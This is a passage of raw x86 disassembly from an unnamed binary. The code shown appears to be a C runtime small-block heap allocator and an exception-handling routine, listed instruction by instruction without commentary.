  425094:	mov    eax,DWORD PTR [ecx+0x8]
  425097:	push   ebx
  425098:	push   esi
  425099:	mov    esi,DWORD PTR [ecx+0x10]
  42509c:	push   edi
  42509d:	xor    ebx,ebx
  42509f:	jmp    0x4250a4
  4250a1:	shl    eax,1
  4250a3:	inc    ebx
  4250a4:	test   eax,eax
  4250a6:	jge    0x4250a1
  4250a8:	mov    eax,ebx
  4250aa:	imul   eax,eax,0x204
  4250b0:	lea    eax,[eax+esi*1+0x144]
  4250b7:	push   0x3f
  4250b9:	mov    DWORD PTR [ebp-0x8],eax
  4250bc:	pop    edx
  4250bd:	mov    DWORD PTR [eax+0x8],eax
  4250c0:	mov    DWORD PTR [eax+0x4],eax
  4250c3:	add    eax,0x8
  4250c6:	dec    edx
  4250c7:	jne    0x4250bd
  4250c9:	push   0x4
  4250cb:	mov    edi,ebx
  4250cd:	push   0x1000
  4250d2:	shl    edi,0xf
  4250d5:	add    edi,DWORD PTR [ecx+0xc]
  4250d8:	push   0x8000
  4250dd:	push   edi
  4250de:	call   DWORD PTR ds:0x4280b0
  4250e4:	test   eax,eax
  4250e6:	jne    0x4250f0
  4250e8:	or     eax,0xffffffff
  4250eb:	jmp    0x42518d
  4250f0:	lea    edx,[edi+0x7000]
  4250f6:	cmp    edi,edx
  4250f8:	mov    DWORD PTR [ebp-0x4],edx
  4250fb:	ja     0x425140
  4250fd:	mov    ecx,edx
  4250ff:	sub    ecx,edi
  425101:	shr    ecx,0xc
  425104:	lea    eax,[edi+0x10]
  425107:	inc    ecx
  425108:	or     DWORD PTR [eax-0x8],0xffffffff
  42510c:	or     DWORD PTR [eax+0xfec],0xffffffff
  425113:	lea    edx,[eax+0xffc]
  425119:	mov    DWORD PTR [eax],edx
  42511b:	lea    edx,[eax-0x1004]
  425121:	mov    DWORD PTR [eax-0x4],0xff0
  425128:	mov    DWORD PTR [eax+0x4],edx
  42512b:	mov    DWORD PTR [eax+0xfe8],0xff0
  425135:	add    eax,0x1000
  42513a:	dec    ecx
  42513b:	jne    0x425108
  42513d:	mov    edx,DWORD PTR [ebp-0x4]
  425140:	mov    eax,DWORD PTR [ebp-0x8]
  425143:	add    eax,0x1f8
  425148:	lea    ecx,[edi+0xc]
  42514b:	mov    DWORD PTR [eax+0x4],ecx
  42514e:	mov    DWORD PTR [ecx+0x8],eax
  425151:	lea    ecx,[edx+0xc]
  425154:	mov    DWORD PTR [eax+0x8],ecx
  425157:	mov    DWORD PTR [ecx+0x4],eax
  42515a:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  42515f:	xor    edi,edi
  425161:	inc    edi
  425162:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  425169:	mov    al,BYTE PTR [esi+0x43]
  42516c:	mov    cl,al
  42516e:	inc    cl
  425170:	test   al,al
  425172:	mov    eax,DWORD PTR [ebp+0x8]
  425175:	mov    BYTE PTR [esi+0x43],cl
  425178:	jne    0x42517d
  42517a:	or     DWORD PTR [eax+0x4],edi
  42517d:	mov    edx,0x80000000
  425182:	mov    ecx,ebx
  425184:	shr    edx,cl
  425186:	not    edx
  425188:	and    DWORD PTR [eax+0x8],edx
  42518b:	mov    eax,ebx
  42518d:	pop    edi
  42518e:	pop    esi
  42518f:	pop    ebx
  425190:	leave  
  425191:	ret    
  425192:	push   ebp
  425193:	mov    ebp,esp
  425195:	sub    esp,0xc
  425198:	mov    ecx,DWORD PTR [ebp+0x8]
  42519b:	mov    eax,DWORD PTR [ecx+0x10]
  42519e:	push   ebx
  42519f:	push   esi
  4251a0:	mov    esi,DWORD PTR [ebp+0x10]
  4251a3:	push   edi
  4251a4:	mov    edi,DWORD PTR [ebp+0xc]
  4251a7:	mov    edx,edi
  4251a9:	sub    edx,DWORD PTR [ecx+0xc]
  4251ac:	add    esi,0x17
  4251af:	shr    edx,0xf
  4251b2:	mov    ecx,edx
  4251b4:	imul   ecx,ecx,0x204
  4251ba:	lea    ecx,[ecx+eax*1+0x144]
  4251c1:	mov    DWORD PTR [ebp-0xc],ecx
  4251c4:	mov    ecx,DWORD PTR [edi-0x4]
  4251c7:	and    esi,0xfffffff0
  4251ca:	dec    ecx
  4251cb:	cmp    esi,ecx
  4251cd:	lea    edi,[ecx+edi*1-0x4]
  4251d1:	mov    ebx,DWORD PTR [edi]
  4251d3:	mov    DWORD PTR [ebp+0x10],ecx
  4251d6:	mov    DWORD PTR [ebp-0x4],ebx
  4251d9:	jle    0x425334
  4251df:	test   bl,0x1
  4251e2:	jne    0x42532d
  4251e8:	add    ebx,ecx
  4251ea:	cmp    esi,ebx
  4251ec:	jg     0x42532d
  4251f2:	mov    ecx,DWORD PTR [ebp-0x4]
  4251f5:	sar    ecx,0x4
  4251f8:	dec    ecx
  4251f9:	cmp    ecx,0x3f
  4251fc:	mov    DWORD PTR [ebp-0x8],ecx
  4251ff:	jbe    0x425207
  425201:	push   0x3f
  425203:	pop    ecx
  425204:	mov    DWORD PTR [ebp-0x8],ecx
  425207:	mov    ebx,DWORD PTR [edi+0x4]
  42520a:	cmp    ebx,DWORD PTR [edi+0x8]
  42520d:	jne    0x425252
  42520f:	cmp    ecx,0x20
  425212:	mov    ebx,0x80000000
  425217:	jae    0x425233
  425219:	shr    ebx,cl
  42521b:	mov    ecx,DWORD PTR [ebp-0x8]
  42521e:	lea    ecx,[ecx+eax*1+0x4]
  425222:	not    ebx
  425224:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425228:	dec    BYTE PTR [ecx]
  42522a:	jne    0x425252
  42522c:	mov    ecx,DWORD PTR [ebp+0x8]
  42522f:	and    DWORD PTR [ecx],ebx
  425231:	jmp    0x425252
  425233:	add    ecx,0xffffffe0
  425236:	shr    ebx,cl
  425238:	mov    ecx,DWORD PTR [ebp-0x8]
  42523b:	lea    ecx,[ecx+eax*1+0x4]
  42523f:	not    ebx
  425241:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425248:	dec    BYTE PTR [ecx]
  42524a:	jne    0x425252
  42524c:	mov    ecx,DWORD PTR [ebp+0x8]
  42524f:	and    DWORD PTR [ecx+0x4],ebx
  425252:	mov    ecx,DWORD PTR [edi+0x8]
  425255:	mov    ebx,DWORD PTR [edi+0x4]
  425258:	mov    DWORD PTR [ecx+0x4],ebx
  42525b:	mov    ecx,DWORD PTR [edi+0x4]
  42525e:	mov    edi,DWORD PTR [edi+0x8]
  425261:	mov    DWORD PTR [ecx+0x8],edi
  425264:	mov    ecx,DWORD PTR [ebp+0x10]
  425267:	sub    ecx,esi
  425269:	add    DWORD PTR [ebp-0x4],ecx
  42526c:	cmp    DWORD PTR [ebp-0x4],0x0
  425270:	jle    0x42531b
  425276:	mov    edi,DWORD PTR [ebp-0x4]
  425279:	mov    ecx,DWORD PTR [ebp+0xc]
  42527c:	sar    edi,0x4
  42527f:	dec    edi
  425280:	cmp    edi,0x3f
  425283:	lea    ecx,[ecx+esi*1-0x4]
  425287:	jbe    0x42528c
  425289:	push   0x3f
  42528b:	pop    edi
  42528c:	mov    ebx,DWORD PTR [ebp-0xc]
  42528f:	lea    ebx,[ebx+edi*8]
  425292:	mov    DWORD PTR [ebp+0x10],ebx
  425295:	mov    ebx,DWORD PTR [ebx+0x4]
  425298:	mov    DWORD PTR [ecx+0x4],ebx
  42529b:	mov    ebx,DWORD PTR [ebp+0x10]
  42529e:	mov    DWORD PTR [ecx+0x8],ebx
  4252a1:	mov    DWORD PTR [ebx+0x4],ecx
  4252a4:	mov    ebx,DWORD PTR [ecx+0x4]
  4252a7:	mov    DWORD PTR [ebx+0x8],ecx
  4252aa:	mov    ebx,DWORD PTR [ecx+0x4]
  4252ad:	cmp    ebx,DWORD PTR [ecx+0x8]
  4252b0:	jne    0x425309
  4252b2:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  4252b6:	mov    BYTE PTR [ebp+0x13],cl
  4252b9:	inc    cl
  4252bb:	cmp    edi,0x20
  4252be:	mov    BYTE PTR [edi+eax*1+0x4],cl
  4252c2:	jae    0x4252e0
  4252c4:	cmp    BYTE PTR [ebp+0x13],0x0
  4252c8:	jne    0x4252d8
  4252ca:	mov    ecx,edi
  4252cc:	mov    ebx,0x80000000
  4252d1:	shr    ebx,cl
  4252d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4252d6:	or     DWORD PTR [ecx],ebx
  4252d8:	lea    eax,[eax+edx*4+0x44]
  4252dc:	mov    ecx,edi
  4252de:	jmp    0x425300
  4252e0:	cmp    BYTE PTR [ebp+0x13],0x0
  4252e4:	jne    0x4252f6
  4252e6:	lea    ecx,[edi-0x20]
  4252e9:	mov    ebx,0x80000000
  4252ee:	shr    ebx,cl
  4252f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252f3:	or     DWORD PTR [ecx+0x4],ebx
  4252f6:	lea    eax,[eax+edx*4+0xc4]
  4252fd:	lea    ecx,[edi-0x20]
  425300:	mov    edx,0x80000000
  425305:	shr    edx,cl
  425307:	or     DWORD PTR [eax],edx
  425309:	mov    edx,DWORD PTR [ebp+0xc]
  42530c:	mov    ecx,DWORD PTR [ebp-0x4]
  42530f:	lea    eax,[edx+esi*1-0x4]
  425313:	mov    DWORD PTR [eax],ecx
  425315:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  425319:	jmp    0x42531e
  42531b:	mov    edx,DWORD PTR [ebp+0xc]
  42531e:	lea    eax,[esi+0x1]
  425321:	mov    DWORD PTR [edx-0x4],eax
  425324:	mov    DWORD PTR [edx+esi*1-0x8],eax
  425328:	jmp    0x425469
  42532d:	xor    eax,eax
  42532f:	jmp    0x42546c
  425334:	jge    0x425469
  42533a:	mov    ebx,DWORD PTR [ebp+0xc]
  42533d:	sub    DWORD PTR [ebp+0x10],esi
  425340:	lea    ecx,[esi+0x1]
  425343:	mov    DWORD PTR [ebx-0x4],ecx
  425346:	lea    ebx,[ebx+esi*1-0x4]
  42534a:	mov    esi,DWORD PTR [ebp+0x10]
  42534d:	sar    esi,0x4
  425350:	dec    esi
  425351:	cmp    esi,0x3f
  425354:	mov    DWORD PTR [ebp+0xc],ebx
  425357:	mov    DWORD PTR [ebx-0x4],ecx
  42535a:	jbe    0x42535f
  42535c:	push   0x3f
  42535e:	pop    esi
  42535f:	test   BYTE PTR [ebp-0x4],0x1
  425363:	jne    0x4253e9
  425369:	mov    esi,DWORD PTR [ebp-0x4]
  42536c:	sar    esi,0x4
  42536f:	dec    esi
  425370:	cmp    esi,0x3f
  425373:	jbe    0x425378
  425375:	push   0x3f
  425377:	pop    esi
  425378:	mov    ecx,DWORD PTR [edi+0x4]
  42537b:	cmp    ecx,DWORD PTR [edi+0x8]
  42537e:	jne    0x4253c2
  425380:	cmp    esi,0x20
  425383:	mov    ebx,0x80000000
  425388:	jae    0x4253a3
  42538a:	mov    ecx,esi
  42538c:	shr    ebx,cl
  42538e:	lea    esi,[esi+eax*1+0x4]
  425392:	not    ebx
  425394:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425398:	dec    BYTE PTR [esi]
  42539a:	jne    0x4253bf
  42539c:	mov    ecx,DWORD PTR [ebp+0x8]
  42539f:	and    DWORD PTR [ecx],ebx
  4253a1:	jmp    0x4253bf
  4253a3:	lea    ecx,[esi-0x20]
  4253a6:	shr    ebx,cl
  4253a8:	lea    ecx,[esi+eax*1+0x4]
  4253ac:	not    ebx
  4253ae:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4253b5:	dec    BYTE PTR [ecx]
  4253b7:	jne    0x4253bf
  4253b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4253bc:	and    DWORD PTR [ecx+0x4],ebx
  4253bf:	mov    ebx,DWORD PTR [ebp+0xc]
  4253c2:	mov    ecx,DWORD PTR [edi+0x8]
  4253c5:	mov    esi,DWORD PTR [edi+0x4]
  4253c8:	mov    DWORD PTR [ecx+0x4],esi
  4253cb:	mov    esi,DWORD PTR [edi+0x8]
  4253ce:	mov    ecx,DWORD PTR [edi+0x4]
  4253d1:	mov    DWORD PTR [ecx+0x8],esi
  4253d4:	mov    esi,DWORD PTR [ebp+0x10]
  4253d7:	add    esi,DWORD PTR [ebp-0x4]
  4253da:	mov    DWORD PTR [ebp+0x10],esi
  4253dd:	sar    esi,0x4
  4253e0:	dec    esi
  4253e1:	cmp    esi,0x3f
  4253e4:	jbe    0x4253e9
  4253e6:	push   0x3f
  4253e8:	pop    esi
  4253e9:	mov    ecx,DWORD PTR [ebp-0xc]
  4253ec:	lea    ecx,[ecx+esi*8]
  4253ef:	mov    edi,DWORD PTR [ecx+0x4]
  4253f2:	mov    DWORD PTR [ebx+0x8],ecx
  4253f5:	mov    DWORD PTR [ebx+0x4],edi
  4253f8:	mov    DWORD PTR [ecx+0x4],ebx
  4253fb:	mov    ecx,DWORD PTR [ebx+0x4]
  4253fe:	mov    DWORD PTR [ecx+0x8],ebx
  425401:	mov    ecx,DWORD PTR [ebx+0x4]
  425404:	cmp    ecx,DWORD PTR [ebx+0x8]
  425407:	jne    0x425460
  425409:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42540d:	mov    BYTE PTR [ebp+0xf],cl
  425410:	inc    cl
  425412:	cmp    esi,0x20
  425415:	mov    BYTE PTR [esi+eax*1+0x4],cl
  425419:	jae    0x425437
  42541b:	cmp    BYTE PTR [ebp+0xf],0x0
  42541f:	jne    0x42542f
  425421:	mov    ecx,esi
  425423:	mov    edi,0x80000000
  425428:	shr    edi,cl
  42542a:	mov    ecx,DWORD PTR [ebp+0x8]
  42542d:	or     DWORD PTR [ecx],edi
  42542f:	lea    eax,[eax+edx*4+0x44]
  425433:	mov    ecx,esi
  425435:	jmp    0x425457
  425437:	cmp    BYTE PTR [ebp+0xf],0x0
  42543b:	jne    0x42544d
  42543d:	lea    ecx,[esi-0x20]
  425440:	mov    edi,0x80000000
  425445:	shr    edi,cl
  425447:	mov    ecx,DWORD PTR [ebp+0x8]
  42544a:	or     DWORD PTR [ecx+0x4],edi
  42544d:	lea    eax,[eax+edx*4+0xc4]
  425454:	lea    ecx,[esi-0x20]
  425457:	mov    edx,0x80000000
  42545c:	shr    edx,cl
  42545e:	or     DWORD PTR [eax],edx
  425460:	mov    eax,DWORD PTR [ebp+0x10]
  425463:	mov    DWORD PTR [ebx],eax
  425465:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425469:	xor    eax,eax
  42546b:	inc    eax
  42546c:	pop    edi
  42546d:	pop    esi
  42546e:	pop    ebx
  42546f:	leave  
  425470:	ret    
  425471:	push   ebp
  425472:	mov    ebp,esp
  425474:	sub    esp,0x14
  425477:	mov    ecx,DWORD PTR [ebp+0x8]
  42547a:	mov    eax,ds:0x45cefc
  42547f:	mov    edx,DWORD PTR ds:0x45cf00
  425485:	add    ecx,0x17
  425488:	and    ecx,0xfffffff0
  42548b:	push   ebx
  42548c:	mov    DWORD PTR [ebp-0x10],ecx
  42548f:	sar    ecx,0x4
  425492:	push   esi
  425493:	lea    eax,[eax+eax*4]
  425496:	push   edi
  425497:	dec    ecx
  425498:	cmp    ecx,0x20
  42549b:	lea    edi,[edx+eax*4]
  42549e:	mov    DWORD PTR [ebp-0x4],edi
  4254a1:	jge    0x4254ae
  4254a3:	or     esi,0xffffffff
  4254a6:	shr    esi,cl
  4254a8:	or     DWORD PTR [ebp-0x8],0xffffffff
  4254ac:	jmp    0x4254bb
  4254ae:	add    ecx,0xffffffe0
  4254b1:	or     eax,0xffffffff
  4254b4:	xor    esi,esi
  4254b6:	shr    eax,cl
  4254b8:	mov    DWORD PTR [ebp-0x8],eax
  4254bb:	mov    eax,ds:0x45cf08
  4254c0:	mov    ebx,eax
  4254c2:	mov    DWORD PTR [ebp-0xc],esi
  4254c5:	cmp    ebx,edi
  4254c7:	jmp    0x4254dd
  4254c9:	mov    ecx,DWORD PTR [ebx+0x4]
  4254cc:	mov    edi,DWORD PTR [ebx]
  4254ce:	and    ecx,DWORD PTR [ebp-0x8]
  4254d1:	and    edi,esi
  4254d3:	or     ecx,edi
  4254d5:	jne    0x4254e2
  4254d7:	add    ebx,0x14
  4254da:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254dd:	mov    DWORD PTR [ebp+0x8],ebx
  4254e0:	jb     0x4254c9
  4254e2:	cmp    ebx,DWORD PTR [ebp-0x4]
  4254e5:	jne    0x42550b
  4254e7:	mov    ebx,edx
  4254e9:	jmp    0x4254fc
  4254eb:	mov    ecx,DWORD PTR [ebx+0x4]
  4254ee:	mov    edi,DWORD PTR [ebx]
  4254f0:	and    ecx,DWORD PTR [ebp-0x8]
  4254f3:	and    edi,esi
  4254f5:	or     ecx,edi
  4254f7:	jne    0x425503
  4254f9:	add    ebx,0x14
  4254fc:	cmp    ebx,eax
  4254fe:	mov    DWORD PTR [ebp+0x8],ebx
  425501:	jb     0x4254eb
  425503:	cmp    ebx,eax
  425505:	je     0x42559f
  42550b:	mov    DWORD PTR ds:0x45cf08,ebx
  425511:	mov    eax,DWORD PTR [ebx+0x10]
  425514:	mov    edx,DWORD PTR [eax]
  425516:	cmp    edx,0xffffffff
  425519:	mov    DWORD PTR [ebp-0x4],edx
  42551c:	je     0x425532
  42551e:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  425525:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  425529:	and    ecx,DWORD PTR [ebp-0x8]
  42552c:	and    edi,esi
  42552e:	or     ecx,edi
  425530:	jne    0x425568
  425532:	mov    edx,DWORD PTR [eax+0xc4]
  425538:	and    edx,DWORD PTR [ebp-0x8]
  42553b:	and    DWORD PTR [ebp-0x4],0x0
  42553f:	lea    ecx,[eax+0x44]
  425542:	mov    esi,DWORD PTR [ecx]
  425544:	and    esi,DWORD PTR [ebp-0xc]
  425547:	or     edx,esi
  425549:	mov    esi,DWORD PTR [ebp-0xc]
  42554c:	jne    0x425565
  42554e:	mov    edx,DWORD PTR [ecx+0x84]
  425554:	and    edx,DWORD PTR [ebp-0x8]
  425557:	inc    DWORD PTR [ebp-0x4]
  42555a:	add    ecx,0x4
  42555d:	mov    edi,DWORD PTR [ecx]
  42555f:	and    edi,esi
  425561:	or     edx,edi
  425563:	je     0x42554e
  425565:	mov    edx,DWORD PTR [ebp-0x4]
  425568:	mov    ecx,edx
  42556a:	imul   ecx,ecx,0x204
  425570:	lea    ecx,[ecx+eax*1+0x144]
  425577:	mov    DWORD PTR [ebp-0xc],ecx
  42557a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42557e:	xor    edi,edi
  425580:	and    ecx,esi
  425582:	jne    0x4255f1
  425584:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42558b:	and    ecx,DWORD PTR [ebp-0x8]
  42558e:	push   0x20
  425590:	pop    edi
  425591:	jmp    0x4255f1
  425593:	cmp    DWORD PTR [ebx+0x8],0x0
  425597:	jne    0x4255a4
  425599:	add    ebx,0x14
  42559c:	mov    DWORD PTR [ebp+0x8],ebx
  42559f:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a2:	jb     0x425593
  4255a4:	cmp    ebx,DWORD PTR [ebp-0x4]
  4255a7:	jne    0x4255cf
  4255a9:	mov    ebx,edx
  4255ab:	jmp    0x4255b6
  4255ad:	cmp    DWORD PTR [ebx+0x8],0x0
  4255b1:	jne    0x4255bd
  4255b3:	add    ebx,0x14
  4255b6:	cmp    ebx,eax
  4255b8:	mov    DWORD PTR [ebp+0x8],ebx
  4255bb:	jb     0x4255ad
  4255bd:	cmp    ebx,eax
  4255bf:	jne    0x4255cf
  4255c1:	call   0x424fd5
  4255c6:	mov    ebx,eax
  4255c8:	test   ebx,ebx
  4255ca:	mov    DWORD PTR [ebp+0x8],ebx
  4255cd:	je     0x4255e7
  4255cf:	push   ebx
  4255d0:	call   0x42508c
  4255d5:	pop    ecx
  4255d6:	mov    ecx,DWORD PTR [ebx+0x10]
  4255d9:	mov    DWORD PTR [ecx],eax
  4255db:	mov    eax,DWORD PTR [ebx+0x10]
  4255de:	cmp    DWORD PTR [eax],0xffffffff
  4255e1:	jne    0x42550b
  4255e7:	xor    eax,eax
  4255e9:	jmp    0x425768
  4255ee:	shl    ecx,1
  4255f0:	inc    edi
  4255f1:	test   ecx,ecx
  4255f3:	jge    0x4255ee
  4255f5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255f8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255fc:	mov    ecx,DWORD PTR [edx]
  4255fe:	sub    ecx,DWORD PTR [ebp-0x10]
  425601:	mov    esi,ecx
  425603:	sar    esi,0x4
  425606:	dec    esi
  425607:	cmp    esi,0x3f
  42560a:	mov    DWORD PTR [ebp-0x8],ecx
  42560d:	jle    0x425612
  42560f:	push   0x3f
  425611:	pop    esi
  425612:	cmp    esi,edi
  425614:	je     0x42571b
  42561a:	mov    ecx,DWORD PTR [edx+0x4]
  42561d:	cmp    ecx,DWORD PTR [edx+0x8]
  425620:	jne    0x42567e
  425622:	cmp    edi,0x20
  425625:	mov    ebx,0x80000000
  42562a:	jge    0x425652
  42562c:	mov    ecx,edi
  42562e:	shr    ebx,cl
  425630:	mov    ecx,DWORD PTR [ebp-0x4]
  425633:	lea    edi,[eax+edi*1+0x4]
  425637:	not    ebx
  425639:	mov    DWORD PTR [ebp-0x14],ebx
  42563c:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  425640:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  425644:	dec    BYTE PTR [edi]
  425646:	jne    0x42567b
  425648:	mov    ecx,DWORD PTR [ebp-0x14]
  42564b:	mov    ebx,DWORD PTR [ebp+0x8]
  42564e:	and    DWORD PTR [ebx],ecx
  425650:	jmp    0x42567e
  425652:	lea    ecx,[edi-0x20]
  425655:	shr    ebx,cl
  425657:	mov    ecx,DWORD PTR [ebp-0x4]
  42565a:	lea    ecx,[eax+ecx*4+0xc4]
  425661:	lea    edi,[eax+edi*1+0x4]
  425665:	not    ebx
  425667:	and    DWORD PTR [ecx],ebx
  425669:	dec    BYTE PTR [edi]
  42566b:	mov    DWORD PTR [ebp-0x14],ebx
  42566e:	jne    0x42567b
  425670:	mov    ebx,DWORD PTR [ebp+0x8]
  425673:	mov    ecx,DWORD PTR [ebp-0x14]
  425676:	and    DWORD PTR [ebx+0x4],ecx
  425679:	jmp    0x42567e
  42567b:	mov    ebx,DWORD PTR [ebp+0x8]
  42567e:	cmp    DWORD PTR [ebp-0x8],0x0
  425682:	mov    ecx,DWORD PTR [edx+0x8]
  425685:	mov    edi,DWORD PTR [edx+0x4]
  425688:	mov    DWORD PTR [ecx+0x4],edi
  42568b:	mov    ecx,DWORD PTR [edx+0x4]
  42568e:	mov    edi,DWORD PTR [edx+0x8]
  425691:	mov    DWORD PTR [ecx+0x8],edi
  425694:	je     0x425727
  42569a:	mov    ecx,DWORD PTR [ebp-0xc]
  42569d:	lea    ecx,[ecx+esi*8]
  4256a0:	mov    edi,DWORD PTR [ecx+0x4]
  4256a3:	mov    DWORD PTR [edx+0x8],ecx
  4256a6:	mov    DWORD PTR [edx+0x4],edi
  4256a9:	mov    DWORD PTR [ecx+0x4],edx
  4256ac:	mov    ecx,DWORD PTR [edx+0x4]
  4256af:	mov    DWORD PTR [ecx+0x8],edx
  4256b2:	mov    ecx,DWORD PTR [edx+0x4]
  4256b5:	cmp    ecx,DWORD PTR [edx+0x8]
  4256b8:	jne    0x425718
  4256ba:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4256be:	mov    BYTE PTR [ebp+0xb],cl
  4256c1:	inc    cl
  4256c3:	cmp    esi,0x20
  4256c6:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4256ca:	jge    0x4256ef
  4256cc:	cmp    BYTE PTR [ebp+0xb],0x0
  4256d0:	jne    0x4256dd
  4256d2:	mov    edi,0x80000000
  4256d7:	mov    ecx,esi
  4256d9:	shr    edi,cl
  4256db:	or     DWORD PTR [ebx],edi
  4256dd:	mov    ecx,esi
  4256df:	mov    edi,0x80000000
  4256e4:	shr    edi,cl
  4256e6:	mov    ecx,DWORD PTR [ebp-0x4]
  4256e9:	or     DWORD PTR [eax+ecx*4+0x44],edi
  4256ed:	jmp    0x425718
  4256ef:	cmp    BYTE PTR [ebp+0xb],0x0
  4256f3:	jne    0x425702
  4256f5:	lea    ecx,[esi-0x20]
  4256f8:	mov    edi,0x80000000
  4256fd:	shr    edi,cl
  4256ff:	or     DWORD PTR [ebx+0x4],edi
  425702:	mov    ecx,DWORD PTR [ebp-0x4]
  425705:	lea    edi,[eax+ecx*4+0xc4]
  42570c:	lea    ecx,[esi-0x20]
  42570f:	mov    esi,0x80000000
  425714:	shr    esi,cl
  425716:	or     DWORD PTR [edi],esi
  425718:	mov    ecx,DWORD PTR [ebp-0x8]
  42571b:	test   ecx,ecx
  42571d:	je     0x42572a
  42571f:	mov    DWORD PTR [edx],ecx
  425721:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  425725:	jmp    0x42572a
  425727:	mov    ecx,DWORD PTR [ebp-0x8]
  42572a:	mov    esi,DWORD PTR [ebp-0x10]
  42572d:	add    edx,ecx
  42572f:	lea    ecx,[esi+0x1]
  425732:	mov    DWORD PTR [edx],ecx
  425734:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  425738:	mov    esi,DWORD PTR [ebp-0xc]
  42573b:	mov    ecx,DWORD PTR [esi]
  42573d:	test   ecx,ecx
  42573f:	lea    edi,[ecx+0x1]
  425742:	mov    DWORD PTR [esi],edi
  425744:	jne    0x425760
  425746:	cmp    ebx,DWORD PTR ds:0x45cef8
  42574c:	jne    0x425760
  42574e:	mov    ecx,DWORD PTR [ebp-0x4]
  425751:	cmp    ecx,DWORD PTR ds:0x45cf10
  425757:	jne    0x425760
  425759:	and    DWORD PTR ds:0x45cef8,0x0
  425760:	mov    ecx,DWORD PTR [ebp-0x4]
  425763:	mov    DWORD PTR [eax],ecx
  425765:	lea    eax,[edx+0x4]
  425768:	pop    edi
  425769:	pop    esi
  42576a:	pop    ebx
  42576b:	leave  
  42576c:	ret    
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	push   esi
  425771:	inc    ebx
  425772:	xor    dh,BYTE PTR [eax]
  425774:	pop    eax
  425775:	inc    ebx
  425776:	xor    BYTE PTR [eax],dh
  425778:	push   ebp
  425779:	mov    ebp,esp
  42577b:	sub    esp,0x8
  42577e:	push   ebx
  42577f:	push   esi
  425780:	push   edi
  425781:	push   ebp
  425782:	cld    
  425783:	mov    ebx,DWORD PTR [ebp+0xc]
  425786:	mov    eax,DWORD PTR [ebp+0x8]
  425789:	test   DWORD PTR [eax+0x4],0x6
  425790:	jne    0x425818
  425796:	mov    DWORD PTR [ebp-0x8],eax
  425799:	mov    eax,DWORD PTR [ebp+0x10]
  42579c:	mov    DWORD PTR [ebp-0x4],eax
  42579f:	lea    eax,[ebp-0x8]
  4257a2:	mov    DWORD PTR [ebx-0x4],eax
  4257a5:	mov    esi,DWORD PTR [ebx+0xc]
  4257a8:	mov    edi,DWORD PTR [ebx+0x8]
  4257ab:	cmp    esi,0xffffffff
  4257ae:	je     0x425811
  4257b0:	lea    ecx,[esi+esi*2]
  4257b3:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  4257b8:	je     0x4257ff
  4257ba:	push   esi
  4257bb:	push   ebp
  4257bc:	lea    ebp,[ebx+0x10]
  4257bf:	call   DWORD PTR [edi+ecx*4+0x4]
  4257c3:	pop    ebp
  4257c4:	pop    esi
  4257c5:	mov    ebx,DWORD PTR [ebp+0xc]
  4257c8:	or     eax,eax
  4257ca:	je     0x4257ff
  4257cc:	js     0x42580a
  4257ce:	mov    edi,DWORD PTR [ebx+0x8]
  4257d1:	push   ebx
  4257d2:	call   0x426700
  4257d7:	add    esp,0x4
  4257da:	lea    ebp,[ebx+0x10]
  4257dd:	push   esi
  4257de:	push   ebx
  4257df:	call   0x426742
  4257e4:	add    esp,0x8
  4257e7:	lea    ecx,[esi+esi*2]
  4257ea:	push   0x1
  4257ec:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257f0:	call   0x4267d6
  4257f5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257f8:	mov    DWORD PTR [ebx+0xc],eax
  4257fb:	call   DWORD PTR [edi+ecx*4+0x8]
  4257ff:	mov    edi,DWORD PTR [ebx+0x8]
  425802:	lea    ecx,[esi+esi*2]
  425805:	mov    esi,DWORD PTR [edi+ecx*4]
  425808:	jmp    0x4257ab
  42580a:	mov    eax,0x0
  42580f:	jmp    0x42582d
  425811:	mov    eax,0x1
  425816:	jmp    0x42582d
  425818:	push   ebp
  425819:	lea    ebp,[ebx+0x10]
  42581c:	push   0xffffffff
  42581e:	push   ebx
  42581f:	call   0x426742
  425824:	add    esp,0x8
  425827:	pop    ebp
  425828:	mov    eax,0x1
  42582d:	pop    ebp
  42582e:	pop    edi
  42582f:	pop    esi
  425830:	pop    ebx
  425831:	mov    esp,ebp
  425833:	pop    ebp
  425834:	ret    
  425835:	push   ebp
  425836:	mov    ecx,DWORD PTR [esp+0x8]
  42583a:	mov    ebp,DWORD PTR [ecx]
  42583c:	mov    eax,DWORD PTR [ecx+0x1c]
  42583f:	push   eax
  425840:	mov    eax,DWORD PTR [ecx+0x18]
  425843:	push   eax
  425844:	call   0x426742
  425849:	add    esp,0x8
  42584c:	pop    ebp
  42584d:	ret    0x4
  425850:	call   0x42375d
  425855:	add    eax,0x8
  425858:	ret    
  425859:	push   0x14
  42585b:	push   0x428770
  425860:	call   0x4238a8
  425865:	mov    edi,DWORD PTR [ebp+0x8]
  425868:	xor    ebx,ebx
  42586a:	cmp    edi,ebx
  42586c:	jne    0x42587c
  42586e:	push   DWORD PTR [ebp+0xc]
  425871:	call   0x4245d2
  425876:	pop    ecx
  425877:	jmp    0x425a00
